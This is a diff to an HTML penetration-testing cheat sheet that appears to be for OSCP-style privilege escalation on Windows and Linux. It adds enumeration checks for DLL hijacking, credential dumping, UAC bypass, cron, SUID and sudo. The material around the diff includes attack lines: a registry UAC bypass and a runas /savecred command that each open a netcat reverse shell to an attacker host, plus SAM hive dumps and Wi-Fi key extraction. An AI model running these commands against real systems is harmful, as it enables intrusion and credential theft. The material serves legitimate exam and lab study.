@@ -604,11 +604,11 @@ copy PowerUp.ps1 "C:\windows\temp\system32.ps1"
 </div>
 <div class="alts">
   <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">type C:\inetpub\wwwroot\web.config 2>nul</code></div>
-  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config 2>/dev/null | findstr connectionString</code></div>
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config 2>nul | findstr connectionString</code></div>
 </div>
 
 <div class="cmd-wrap"><div class="cmd-label">Writable directories (for dropping tools)</div>
-<pre class="cmd">icacls C:\ /T /C 2>/dev/null | findstr /i "(W)" | findstr /i "Users Everyone"</pre>
+<pre class="cmd">icacls C:\ /T /C 2>nul | findstr /i "(W)" | findstr /i "Users Everyone"</pre>
 </div>
 <div class="alts">
   <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">{{WPATH}}\accesschk.exe -uwdqs Users C:\ 2>nul</code></div>
@@ -941,27 +941,37 @@ sc.exe start &lt;ServiceName&gt;</pre></div>
 1) App directory → 2) C:\Windows\System32 → 3) C:\Windows\System → 4) C:\Windows → 5) Current dir → 6) PATH entries (left to right).
 <strong>Goal:</strong> Find a service that loads a DLL marked "NAME NOT FOUND" in ProcMon and place yours in a directory that's searched BEFORE the real DLL location — or in the app directory if you can write there.
 </div>
-<div class="callout callout-warn"><strong>⚠️ ProcMon is the only reliable way to find this.</strong> Run it on a test VM with the same service, filter on Process Name = service.exe, Result = "NAME NOT FOUND", Path ends with ".dll". Note the missing DLL name and the searched path you can write to.</div>
+<div class="callout callout-tip"><strong>💡 Manual method works on the exam.</strong> ProcMon helps on a test VM, but you can find hijackable DLLs manually: check if the service app directory is writable (most common), or if a writable PATH dir exists before System32. Common missing DLLs: version.dll, wlbsctrl.dll, wtsapi32.dll, wow64log.dll, msi.dll.</div>
 
 <div class="pipeline">
 <div class="pipe-step pipe-detect">
-<span class="pipe-step-label">1. DETECT — find services and writable PATH dirs</span>
-<div class="cmd-wrap"><div class="cmd-label">List running services with non-system paths</div>
+<span class="pipe-step-label">1. DETECT — find services with non-system paths and writable locations</span>
+<div class="cmd-wrap"><div class="cmd-label">List running services with non-system paths (PS)</div>
 <pre class="cmd">Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} | Where-Object {$_.PathName -notlike "*System32*"}</pre></div>
-<div class="cmd-wrap"><div class="cmd-label">Check all directories in %PATH% — look for ones you can write to</div>
-<pre class="cmd">$env:path
-# Then check each dir:
-icacls "C:\Some\Path\In\PATH"</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">CMD equivalent</div>
+<pre class="cmd">wmic service get name,pathname,startmode | findstr /i "auto" | findstr /iv "system32"</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Check all directories in %PATH% for writability (CMD — no tools needed)</div>
+<pre class="cmd">for %d in (%PATH%) do @icacls "%d" 2>nul | findstr /i "(W)\|(F)\|BUILTIN\Users" && echo WRITABLE: %d</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">PowerShell PATH writability check</div>
+<pre class="cmd">$env:PATH.Split(';') | ForEach-Object {
+  try { [System.IO.File]::Create("$_\test_w.tmp").Close(); Remove-Item "$_\test_w.tmp" -EA SilentlyContinue; Write-Host "WRITABLE: $_" }
+  catch {}
+}</pre></div>
 </div>
 <div class="pipe-step pipe-confirm">
-<span class="pipe-step-label">2. CONFIRM — identify missing DLL and writable drop location</span>
-<div class="cmd-wrap"><div class="cmd-label">Check write access to service app directory or PATH dirs</div>
-<pre class="cmd">icacls "C:\Path\To\ServiceDir"
-{{WPATH}}\accesschk.exe -dqv "C:\Path\In\PATH\variable" /accepteula</pre></div>
-<div class="cmd-wrap"><div class="cmd-label">Verify the missing DLL name (from ProcMon on test box)</div>
-<pre class="cmd"># On VICTIM — list DLLs the service directory has (see what's present/missing):
-dir "C:\Path\To\ServiceDir\*.dll"
-# The missing one is your target (e.g. version.dll, wlbsctrl.dll, etc.)</pre></div>
+<span class="pipe-step-label">2. CONFIRM — verify write access and identify which DLL is missing</span>
+<div class="cmd-wrap"><div class="cmd-label">Check write access to service app directory (CMD)</div>
+<pre class="cmd">icacls "C:\Path\To\ServiceDir" 2>nul | findstr /i "(W)\|(F)\|Users\|Everyone"
+# (W) or (F) for Users or Everyone = writable</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">List DLLs in the service directory — gaps are candidates</div>
+<pre class="cmd">dir "C:\Path\To\ServiceDir\*.dll"
+# Common hijackable DLLs when missing: version.dll, wlbsctrl.dll, wtsapi32.dll</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Confirm two conditions for exploitability</div>
+<pre class="cmd"># 1) DLL is not in the service directory (or app dir)
+dir "C:\Path\To\ServiceDir\version.dll" 2>nul || echo "Missing - candidate"
+# 2) You can write to the service app dir OR to a PATH dir that comes before System32
+echo %PATH%
+icacls "C:\writable\path" 2>nul</pre></div>
 </div>
 <div class="pipe-step pipe-kali">
 <span class="pipe-step-label">KALI — compile malicious DLL</span>
@@ -1316,10 +1326,10 @@ findstr /spin "password" *.*</pre></div>
 </div>
 
 <div class="cmd-wrap"><div class="cmd-label">Unattended install files — classic goldmine</div>
-<pre class="cmd">type c:\sysprep.inf 2>/dev/null
-type c:\sysprep\sysprep.xml 2>/dev/null
-type c:\unattend.xml 2>/dev/null
-type %WINDIR%\Panther\Unattend\Unattended.xml 2>/dev/null
+<pre class="cmd">type c:\sysprep.inf 2>nul
+type c:\sysprep\sysprep.xml 2>nul
+type c:\unattend.xml 2>nul
+type %WINDIR%\Panther\Unattend\Unattended.xml 2>nul
 type %WINDIR%\Panther\Unattended.xml 2>nul</pre></div>
 <div class="alts">
   <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">dir C:\ /s /b | findstr /i unattend</code></div>
@@ -1347,7 +1357,7 @@ reg query HKCU\Software\ORL\WinVNC3\Password 2>nul</pre></div>
 <pre class="cmd">netsh wlan show profiles</pre></div>
 <div class="alts">
   <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">netsh wlan show profile name="SSID" key=clear</code></div>
-  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">for /f "tokens=2 delims=:" %a in ('netsh wlan show profiles ^| findstr Profile') do @netsh wlan show profile %a key=clear 2>/dev/null | findstr Key</code></div>
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">for /f "tokens=2 delims=:" %a in ('netsh wlan show profiles ^| findstr Profile') do @netsh wlan show profile %a key=clear 2>nul | findstr Key</code></div>
 </div>
 
 <div class="cmd-wrap"><div class="cmd-label">Windows Credential Manager saved credentials</div>
@@ -1357,7 +1367,7 @@ reg query HKCU\Software\ORL\WinVNC3\Password 2>nul</pre></div>
 </div>
 
 <div class="cmd-wrap"><div class="cmd-label">IIS web.config database connection strings</div>
-<pre class="cmd">type C:\inetpub\wwwroot\web.config 2>/dev/null | findstr -i "connectionString\|password\|pwd"</pre></div>
+<pre class="cmd">type C:\inetpub\wwwroot\web.config 2>nul | findstr /i "connectionString password pwd"</pre></div>
 </div>
 <div class="subsection"><div class="subsection-title">AzureAD Connect — Recover AD Sync Credentials (Monteverde)</div>
 <div class="callout callout-warn"><strong>⚠️ Seen on: Monteverde (HTB)</strong> Azure AD Connect stores the AD sync account credentials in an encrypted MSSQL database on the sync server. Can be decrypted from the SYSTEM context.</div>
@@ -1402,6 +1412,24 @@ Add-Type -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll"
 SAM = local password hashes | SYSTEM = decryption key | NTDS.dit = ALL domain hashes (on DC) | SECURITY = LSA secrets + cached creds | NTUSER.dat = user-specific registry
 </div>
 
+<div class="pipeline">
+<div class="pipe-step pipe-detect">
+<span class="pipe-step-label">1. DETECT — confirm prerequisites before dumping</span>
+<div class="cmd-wrap"><div class="cmd-label">Check if you have SeBackupPrivilege (admin or backup operator)</div>
+<pre class="cmd">whoami /priv | findstr /i "SeBackup"
+# SeBackupPrivilege  Enabled = you can dump SAM without being admin</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Check if Windows.old exists (no admin needed)</div>
+<pre class="cmd">dir C:\windows.old\Windows\System32\SAM 2>nul
+dir C:\windows.old\Windows\System32\SYSTEM 2>nul</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Check for existing shadow copies</div>
+<pre class="cmd">vssadmin list shadows
+wmic shadowcopy list brief</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Confirm you are admin (reg save requires admin or SeBackup)</div>
+<pre class="cmd">net localgroup Administrators
+whoami /groups | findstr /i "S-1-5-32-544"</pre></div>
+</div>
+</div>
+
 <div class="subsection"><div class="subsection-title">Dump SAM + SYSTEM (requires Admin/SeBackup)</div>
 <div class="cmd-wrap"><pre class="cmd">reg save hklm\sam {{WPATH}}\sam
 reg save hklm\system {{WPATH}}\system</pre></div>
@@ -1417,7 +1445,7 @@ samdump2 system sam</pre></div>
 
 <div class="subsection"><div class="subsection-title">Windows.old / Volume Shadow Copies</div>
 <div class="cmd-wrap"><div class="cmd-label">Check for Windows.old folder</div>
-<pre class="cmd">dir C:\windows.old\Windows\System32\SAM 2>/dev/null
+<pre class="cmd">dir C:\windows.old\Windows\System32\SAM 2>nul
 dir C:\windows.old\Windows\System32\SYSTEM 2>nul</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">List shadow copies</div>
 <pre class="cmd">vssadmin list shadows</pre></div>
@@ -1599,6 +1627,22 @@ Use GodPotato first — it works on everything from Win Vista to Win11.
 <div class="callout callout-tip">
 <strong>Quick Decision</strong>
 GodPotato → PrintSpoofer → SweetPotato → SigmaPotato → RoguePotato → JuicyPotato (only if pre-2019)
+</div>
+
+<div class="pipeline">
+<div class="pipe-step pipe-detect">
+<span class="pipe-step-label">1. DETECT — confirm SeImpersonate is present AND Enabled</span>
+<div class="cmd-wrap"><div class="cmd-label">Check privilege — must show Enabled (not just Listed)</div>
+<pre class="cmd">whoami /priv | findstr /i "SeImpersonate\|SeAssignPrimaryToken"
+# SeImpersonatePrivilege   Enabled = exploitable
+# SeAssignPrimaryTokenPrivilege  Enabled = fallback</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Check OS build — determines which potato to use</div>
+<pre class="cmd">systeminfo | findstr /i "OS Name\|OS Version\|Build"
+# Build 17763+ (Server 2019 / Win10 1809+) = JuicyPotato FAILS → use GodPotato</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">PowerShell alternative</div>
+<pre class="cmd">[System.Environment]::OSVersion.Version
+(Get-WmiObject Win32_OperatingSystem).BuildNumber</pre></div>
+</div>
 </div>
 
 <!-- OS Compat table -->
@@ -1885,15 +1929,28 @@ Already admin but can't do admin things? UAC bypass will get you to High Mandato
 
 <div class="pipeline">
 <div class="pipe-step pipe-detect">
-<span class="pipe-step-label">1. DETECT</span>
-<div class="cmd-wrap"><pre class="cmd">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
+<span class="pipe-step-label">1. DETECT — check UAC level and your integrity</span>
+<div class="cmd-wrap"><div class="cmd-label">Check if UAC is enabled and what level</div>
+<pre class="cmd">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin</pre></div>
+<div class="callout callout-info" style="margin:6px 0">
+<strong>ConsentPromptBehaviorAdmin values:</strong>
+<ul style="margin:4px 0 0 16px">
+  <li><code>0</code> — No prompts — bypasses are <strong>unnecessary</strong> (already elevated)</li>
+  <li><code>1</code> — Prompt credentials on secure desktop — bypasses <strong>fail</strong></li>
+  <li><code>2</code> — Prompt consent on secure desktop — bypasses <strong>fail</strong> (secure desktop prevents COM hijack)</li>
+  <li><code>5</code> (default) — Prompt consent for non-Windows binaries — bypasses <strong>work</strong> ✓</li>
+</ul>
+<strong>Only attempt bypass if value = 5 (or EnableLUA = 0x0)</strong>
+</div>
 </div>
 <div class="pipe-step pipe-confirm">
-<span class="pipe-step-label">2. CONFIRM</span>
+<span class="pipe-step-label">2. CONFIRM — verify you are medium integrity (not already high)</span>
 <div class="cmd-wrap"><pre class="cmd">whoami /groups | findstr /i "S-1-16-8192"
-# Medium Mandatory Level = UAC restricted token (S-1-16-8192)
-# High Mandatory Level = full admin token (S-1-16-12288)</pre></div>
+# Medium Mandatory Level = UAC restricted token (S-1-16-8192) → bypass needed
+# High Mandatory Level = full admin token (S-1-16-12288) → no bypass needed
+whoami /groups | findstr /i "Administrators"
+# Must be in Administrators group to use UAC bypass</pre></div>
 </div>
 <div class="pipe-step pipe-exploit">
 <span class="pipe-step-label">3. EXPLOIT</span>
@@ -1905,7 +1962,7 @@ fodhelper.exe</pre></div>
 reg add HKCU\Software\Classes\mscfile\Shell\Open\command /d "{{WPATH}}\nc64.exe -e cmd.exe {{KALI_IP}} {{RPORT}}" /f
 eventvwr.exe</pre></div>
 <div class="cmd-wrap"><pre class="cmd"># Cleanup after success
-reg delete HKCU\Software\Classes\ms-settings /f 2>/dev/null
+reg delete HKCU\Software\Classes\ms-settings /f 2>nul
 reg delete HKCU\Software\Classes\mscfile /f 2>nul</pre></div>
 </div>
 <div class="pipe-step pipe-verify">
@@ -1928,6 +1985,26 @@ reg delete HKCU\Software\Classes\mscfile /f 2>nul</pre></div>
 <div class="callout callout-warn">
 <strong>Requires Admin/SeDebug</strong> LSASS dump requires local admin or SeDebugPrivilege. Defender usually blocks obvious methods — use comsvcs.dll method which is more stealthy.
 </div>
+
+<div class="pipeline">
+<div class="pipe-step pipe-detect">
+<span class="pipe-step-label">1. DETECT — check prerequisites BEFORE attempting dump</span>
+<div class="cmd-wrap"><div class="cmd-label">Confirm SeDebugPrivilege is Enabled (not just Listed)</div>
+<pre class="cmd">whoami /priv | findstr /i "SeDebug"
+# SeDebugPrivilege  Enabled = can open LSASS handle</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Check RunAsPPL (LSA Protection) — if enabled, most methods fail silently</div>
+<pre class="cmd">reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
+# 0x1 = PPL enabled → procdump, comsvcs.dll will fail
+# 0x0 or key absent = PPL disabled → methods work normally</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Check Credential Guard (virtualization-based — blocks plaintext extraction)</div>
+<pre class="cmd">reg query HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard /v EnableVirtualizationBasedSecurity 2>nul
+# If 0x1 and WDIGEST disabled → plaintext creds unavailable via LSASS</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Check if WDigest enabled (enables plaintext password caching)</div>
+<pre class="cmd">reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
+# 0x1 = plaintext in LSASS | 0x0 = hashes only</pre></div>
+</div>
+</div>
+
 <div class="cmd-wrap"><div class="cmd-label">Get LSASS PID</div>
 <pre class="cmd">tasklist /fi "imagename eq lsass.exe"
 Get-Process lsass</pre></div>
@@ -1956,6 +2033,16 @@ Get-Process lsass</pre></div>
   <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">vaultcmd /list</code></div>
   <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">rundll32.exe keymgr.dll,KRShowKeyMgr</code> — GUI</div>
 </div>
+<div class="callout callout-info" style="margin:6px 0">
+<strong>Interpreting cmdkey /list output:</strong>
+<ul style="margin:4px 0 0 16px">
+  <li><strong>Type: Generic</strong> — application credential (e.g. WinSCP, git) → <code>runas /savecred</code> may work</li>
+  <li><strong>Type: Domain Password</strong> — Windows domain credential → usable with <code>runas /savecred /user:DOMAIN\user</code></li>
+  <li><strong>Type: Certificate</strong> — certificate-based auth → extract with SharpDPAPI/mimikatz</li>
+  <li><strong>Target: MicrosoftOffice*</strong> — O365 creds → decrypt with SharpDPAPI</li>
+  <li><strong>Target: TERMSRV/*</strong> — RDP saved password → use with <code>runas /savecred</code> for that host</li>
+</ul>
+</div>
 <div class="cmd-wrap"><div class="cmd-label">Use saved credentials to execute as that user (no password needed)</div>
 <pre class="cmd">runas /savecred /user:{{DOMAIN}}\{{USER}} cmd.exe
 runas /savecred /user:{{USER}} "{{WPATH}}\nc64.exe -e cmd.exe {{KALI_IP}} {{RPORT}}"</pre></div>
@@ -1980,8 +2067,18 @@ dir %LOCALAPPDATA%\Microsoft\Credentials\
 <div class="cmd-wrap"><div class="cmd-label">accesschk — list all services where Users/Authenticated Users can write</div>
 <pre class="cmd">{{WPATH}}\accesschk.exe -uwcqv "Users" HKLM\SYSTEM\CurrentControlSet\Services /accepteula
 {{WPATH}}\accesschk.exe -uwcqv "Authenticated Users" HKLM\SYSTEM\CurrentControlSet\Services /accepteula</pre></div>
-<div class="cmd-wrap"><div class="cmd-label">PowerShell alternative</div>
-<pre class="cmd">Get-Acl HKLM:\SYSTEM\CurrentControlSet\Services\* | Where-Object { $_.AccessToString -match 'Users.*FullControl|Users.*SetValue' }</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">CMD fallback — test write on a specific service key (no tools needed)</div>
+<pre class="cmd">reg add HKLM\SYSTEM\CurrentControlSet\Services\&lt;ServiceName&gt; /v TestWrite /t REG_SZ /d test /f 2>nul
+# If succeeds (no error) → key is writable by current user
+# Clean up immediately:
+reg delete HKLM\SYSTEM\CurrentControlSet\Services\&lt;ServiceName&gt; /v TestWrite /f 2>nul</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">PowerShell — loop all services and check ACL (no tools needed)</div>
+<pre class="cmd">Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
+  $acl = Get-Acl $_.PSPath
+  if ($acl.AccessToString -match "Users.*(FullControl|SetValue|WriteKey)") {
+    Write-Host "WRITABLE: $($_.PSChildName)"
+  }
+}</pre></div>
 </div>
 <div class="pipe-step pipe-confirm">
 <span class="pipe-step-label">2. CONFIRM — read current ImagePath value (you'll restore this later)</span>
@@ -2481,12 +2578,17 @@ impacket-psexec WORKGROUP/Administrator@{{TARGET}} -hashes :NTLM_HASH</pre></div
 <div class="callout callout-warn"><strong>⚠️ When to use:</strong> In old AD environments (pre-MS14-025). Group Policy Preferences stored local admin passwords in SYSVOL in AES-256 — but Microsoft published the key. Any domain user can read SYSVOL and decrypt.</div>
 <div class="pipeline">
   <div class="pipe-step pipe-detect"><div class="pipe-step-label">DETECT — search SYSVOL for cpassword</div>
+    <pre class="cmd"># From Windows target (domain-joined) — CMD
+findstr /S /I cpassword \\{{DOMAIN}}\SYSVOL\{{DOMAIN}}\Policies\*.xml 2>nul</pre>
+    <pre class="cmd"># From Windows target — PowerShell (no extra tools)
+Get-ChildItem -Path "\\{{DOMAIN}}\SYSVOL" -Recurse -Filter "*.xml" -ErrorAction SilentlyContinue |
+  Select-String -Pattern "cpassword" | Select-Object Path,Line</pre>
     <pre class="cmd"># From Kali (using SMB)
 smbclient \\\\{{TARGET}}\\SYSVOL -U {{USER}}%{{PASS}}
 smb: \&gt; recurse on
 smb: \&gt; prompt off
 smb: \&gt; mget *</pre>
-    <pre class="cmd"># Search downloaded files for cpassword
+    <pre class="cmd"># Search downloaded files for cpassword (Kali)
 grep -r "cpassword" . --include="*.xml"
 find . -name "*.xml" -exec grep -l "cpassword" {} \;</pre>
   </div>
@@ -2991,6 +3093,18 @@ cat /etc/crontab</pre></div>
   <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">./pspy32</code> — 32-bit target</div>
   <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">./pspy64</code> — basic mode (no file events)</div>
 </div>
+<div class="cmd-wrap"><div class="cmd-label">No pspy? — pure bash process poll for root-owned commands (replaces pspy for basic detection)</div>
+<pre class="cmd">while true; do
+  ps -eo pid,user,cmd --no-headers | awk '$2=="root" && $3!~/^\[/' | grep -v ' ps$'
+  sleep 1
+done | sort -u
+# Let run 2+ minutes. New lines = newly spawned root processes (cron, services, etc.)</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Find root-owned service config files that are world-writable (service config hijack)</div>
+<pre class="cmd">find /etc/systemd/system /lib/systemd/system /etc/init.d /etc/rc*.d -type f -writable 2>/dev/null
+# Writable unit file = edit ExecStart → next service restart runs your payload as root</pre></div>
+<div class="alts">
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">find /etc/init.d -type f -writable 2>/dev/null</code> — SysV init scripts (older systems)</div>
+</div>
 <div class="notes-toggle" onclick="toggleNotes('lin-service')">&#128221; Notes</div>
 <textarea class="notes-area" id="notes-lin-service" onchange="saveNote('lin-service',this.value)" placeholder="Add your notes here..."></textarea>
 </section>
@@ -3078,6 +3192,18 @@ sed -i '/newroot/d' /etc/passwd</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">One-liner to find any writable cron script (fastest check)</div>
 <pre class="cmd">find /etc/cron* /var/spool/cron -type f -writable 2>/dev/null
 # Any result = instant privesc — inject reverse shell or SUID bash</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Check ALL user crontab directories, not just root</div>
+<pre class="cmd">ls -la /var/spool/cron/crontabs/ 2>/dev/null
+# Look for: crontab files owned by root running with root privileges</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Second-order: extract script paths FROM cron files and check those for write access</div>
+<pre class="cmd">grep -rhE '^\s*[^#]' /etc/cron* /var/spool/cron 2>/dev/null \
+  | awk '{for(i=6;i<=NF;i++) if($i ~ /^\//) print $i}' \
+  | sort -u \
+  | xargs -I{} sh -c 'test -w "{}" && ls -la "{}"' 2>/dev/null
+# Any result = the script called by a cron job is writable → inject payload there</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Check if cron runs scripts from a directory you own or can write to (PATH hijack)</div>
+<pre class="cmd">grep -r 'PATH=' /etc/crontab /etc/cron.d/* 2>/dev/null
+# If cron PATH includes /tmp or a user-writable dir before /usr/bin → PATH hijack possible</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Alternative cron log locations (if syslog missing)</div>
 <pre class="cmd">grep "CRON\|cron" /var/log/cron.log 2>/dev/null | tail -20
 grep "CRON\|cron" /var/log/auth.log 2>/dev/null | tail -20</pre></div>
@@ -3191,17 +3317,29 @@ grep newroot /etc/passwd  # should return nothing</pre></div>
 <span class="pipe-step-label">1. DETECT SUID</span>
 <div class="cmd-wrap"><pre class="cmd">find / -perm -4000 -type f 2>/dev/null</pre></div>
 <div class="cmd-wrap"><pre class="cmd">ls -l $(find / -perm -4000 -type f 2>/dev/null)</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Spot non-standard SUID binaries — compare against known-good list</div>
+<pre class="cmd">find / -perm -4000 -type f 2>/dev/null | grep -Ev '^(/usr/bin/sudo|/usr/bin/passwd|/usr/bin/su|/usr/bin/newgrp|/usr/bin/chsh|/usr/bin/chfn|/usr/bin/gpasswd|/bin/su|/bin/mount|/bin/umount|/bin/ping|/usr/sbin/pppd)$'
+# Anything not in this list is non-standard and worth investigating on GTFOBins</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">CRITICAL: check if any SUID binary is also writable (directly overwritable)</div>
+<pre class="cmd">find / -perm -4000 -type f -writable 2>/dev/null
+# Any result = overwrite binary content with your own shell → instant root</pre></div>
 </div>
 <div class="pipe-step pipe-detect">
 <span class="pipe-step-label">1b. DETECT Capabilities</span>
 <div class="cmd-wrap"><pre class="cmd">/usr/sbin/getcap -r / 2>/dev/null</pre></div>
-<div class="cmd-wrap"><pre class="cmd">getcap /path/to/binary</pre></div>
+<div class="alts">
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">getcap -r / 2>/dev/null</code></div>
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">cat /proc/*/status 2>/dev/null | grep -A5 'CapEff' | grep -v '^--$'</code> — raw capability check without getcap</div>
+</div>
 </div>
 <div class="pipe-step pipe-confirm">
-<span class="pipe-step-label">2. CONFIRM</span>
-<div class="cmd-wrap"><pre class="cmd">ps u -C &lt;binary_name&gt;
-cat /proc/&lt;PID&gt;/status | grep Uid
-strings /path/to/suid-binary
+<span class="pipe-step-label">2. CONFIRM — verify the binary runs as root and is exploitable</span>
+<div class="cmd-wrap"><pre class="cmd"># Confirm effective UID when SUID binary runs:
+ls -la /path/to/suid-binary
+# Must show: -rwsr-xr-x root root (the 's' in owner execute = SUID active)
+# Confirm it's owned by root (not just SUID-set by non-root):
+stat /path/to/suid-binary | grep -E 'Uid|Access'</pre></div>
+<div class="cmd-wrap"><pre class="cmd">strings /path/to/suid-binary
 ltrace /path/to/suid-binary 2>&1</pre></div>
 </div>
 <div class="pipe-step pipe-exploit">
@@ -3281,18 +3419,28 @@ Then check the binary against GTFOBins lookup below.
 </div>
 <div class="pipeline">
 <div class="pipe-step pipe-detect">
-<span class="pipe-step-label">1. DETECT</span>
+<span class="pipe-step-label">1. DETECT — list all sudo rules for your user</span>
 <div class="cmd-wrap"><pre class="cmd">sudo -l</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Also check sudoers.d — sudo -l may omit entries if you don't know your password</div>
+<pre class="cmd">cat /etc/sudoers 2>/dev/null
+ls -la /etc/sudoers.d/ 2>/dev/null
+cat /etc/sudoers.d/* 2>/dev/null
+# Look for your username or your group (check 'id' for group names)</pre></div>
 </div>
 <div class="pipe-step pipe-confirm">
-<span class="pipe-step-label">2. CONFIRM</span>
+<span class="pipe-step-label">2. CONFIRM — verify each dangerous condition is actually exploitable</span>
 <div class="cmd-wrap"><pre class="cmd"># Check each allowed binary against GTFOBins
-# Look for:
-# - NOPASSWD entries (no password required)
-# - Wildcard * (can pass any arguments)
-# - env_keep LD_PRELOAD (LD_PRELOAD attack)
-# Check sudo version for CVE-2021-3156:
-sudo --version</pre></div>
+# Confirm NOPASSWD (no password barrier):
+sudo -l | grep NOPASSWD
+# Confirm wildcard * present (argument injection):
+sudo -l | grep '\*'
+# Confirm env_keep includes LD_PRELOAD (critical — enables shared lib injection):
+sudo -l | grep LD_PRELOAD && echo 'LD_PRELOAD KEPT — shared library injection possible!'
+# Check sudo version for CVE-2021-3156 (Baron Samedit):
+sudo --version | head -1</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Confirm PwnKit is present for CVE-2021-4034 (check independently of sudo)</div>
+<pre class="cmd">ls -la /usr/bin/pkexec 2>/dev/null | grep -E '^-rws'
+# -rwsr-xr-x with root ownership = pkexec SUID present — check kernel/pkexec version</pre></div>
 </div>
 <div class="pipe-step pipe-exploit">
 <span class="pipe-step-label">3. EXPLOIT</span>
@@ -3373,6 +3521,16 @@ uname -a — x86_64 = 64-bit | i686/i386 = 32-bit. Run the matching exploit bina
 </div>
 <div class="cmd-wrap"><div class="cmd-label">Get kernel version for lookup</div>
 <pre class="cmd">uname -r && cat /etc/os-release</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Pure bash: check the three most reliable kernel privesc paths without any external tool</div>
+<pre class="cmd"># 1. PwnKit (CVE-2021-4034) — pkexec SUID present + version < 0.120?
+ls -la /usr/bin/pkexec 2>/dev/null && pkexec --version 2>/dev/null
+# Present + version <= 0.119 = likely vulnerable
+
+# 2. DirtyPipe (CVE-2022-0847) — kernel 5.8 to 5.16.11
+uname -r | awk -F'[.-]' '{v=$1"."$2"."$3; if(v>="5.8.0" && v<="5.16.11") print "DIRTYPIPE RANGE: " v " — check build date"}'
+
+# 3. Baron Samedit (CVE-2021-3156) — sudo < 1.9.5p2
+sudo --version 2>/dev/null | head -1</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Run exploit suggester (copy to target)</div>
 <pre class="cmd">./linux-exploit-suggester.sh</pre></div>
 <div class="alts">
@@ -3430,14 +3588,18 @@ If a cron job runs <code>tar -czf backup.tar.gz /var/www/*</code>, you can creat
 </div>
 <div class="pipeline">
 <div class="pipe-step pipe-detect">
-<span class="pipe-step-label">1. DETECT</span>
-<div class="cmd-wrap"><pre class="cmd">grep -r 'tar ' /etc/cron* /var/spool/cron 2>/dev/null
-cat /etc/crontab | grep '\*'</pre></div>
+<span class="pipe-step-label">1. DETECT — find wildcard usage across ALL exploitable commands in cron</span>
+<div class="cmd-wrap"><pre class="cmd">grep -rE '\btar\b.*\*|\bchown\b.*\*|\bchmod\b.*\*|\brsync\b.*\*' /etc/cron* /var/spool/cron 2>/dev/null
+# Catches tar, chown, chmod, and rsync wildcards — not just tar</pre></div>
+<div class="alts">
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">cat /etc/crontab /etc/cron.d/* 2>/dev/null | grep -v '^#' | grep '\*/'</code> — catch interval wildcards too</div>
+</div>
 </div>
 <div class="pipe-step pipe-confirm">
-<span class="pipe-step-label">2. CONFIRM</span>
+<span class="pipe-step-label">2. CONFIRM — verify you can write to the wildcard directory</span>
 <div class="cmd-wrap"><pre class="cmd">ls -la /path/to/wildcard/directory
-# Check if you can write files there</pre></div>
+test -w /path/to/wildcard/directory && echo 'WRITABLE — wildcard injection possible!' || echo 'not writable'
+# Must be writable to plant checkpoint/argument-named files</pre></div>
 </div>
 <div class="pipe-step pipe-exploit">
 <span class="pipe-step-label">3. EXPLOIT — create files that tar treats as arguments</span>
@@ -3483,14 +3645,27 @@ rm -f /tmp/rootbash /tmp/f</pre></div>
 </div>
 <div class="pipeline">
 <div class="pipe-step pipe-detect">
-<span class="pipe-step-label">1. DETECT</span>
